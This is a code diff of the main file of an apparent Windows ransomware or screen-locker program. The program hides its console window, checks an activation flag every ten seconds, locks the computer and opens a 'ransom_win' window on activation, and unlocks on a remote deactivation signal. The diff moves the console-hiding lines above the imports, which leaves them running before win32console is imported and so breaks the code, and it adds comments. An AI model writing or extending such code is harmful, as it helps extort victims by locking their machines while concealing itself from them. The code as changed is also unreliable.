@@ -1,5 +1,7 @@
 """ this is the main file """
-
+#Hide the Console
+window = win32console.GetConsoleWindow()
+win32gui.ShowWindow(window, 0)
 import requests
 from finals import Finals as final
 from threading import Thread
@@ -11,9 +13,7 @@ import schedule
 import win32console
 import win32gui
 
-#Hide the Console
-window = win32console.GetConsoleWindow()
-win32gui.ShowWindow(window, 0)
+
 
 """important global vars"""
 
@@ -80,18 +80,18 @@ def main():
         if is_open != get(final.active_field) and is_open == 0:  # check if locking has already done (case of pc in restart)
             replace(final.active_field, 1)
             lock()
-            open_window = Thread(target=ransom_win)
+            open_window = Thread(target=ransom_win)  # open the locking widnow with thread, lock
             open_window.start()
     elif activation == "0":  # if need to close
         if is_open != get(final.active_field) and is_open == 1:
-            replace(final.active_field, 0)
+            replace(final.active_field, 0)  # not activated
             unlock()
     else:
         return
 
+ 
 """
-scheduler.add_job(main, 'cron', second=final.repeats)  # run every x seconds
-scheduler.start()
+schedules program to run each 10 seconds
 """
 
 schedule.every(10).seconds.do(main)
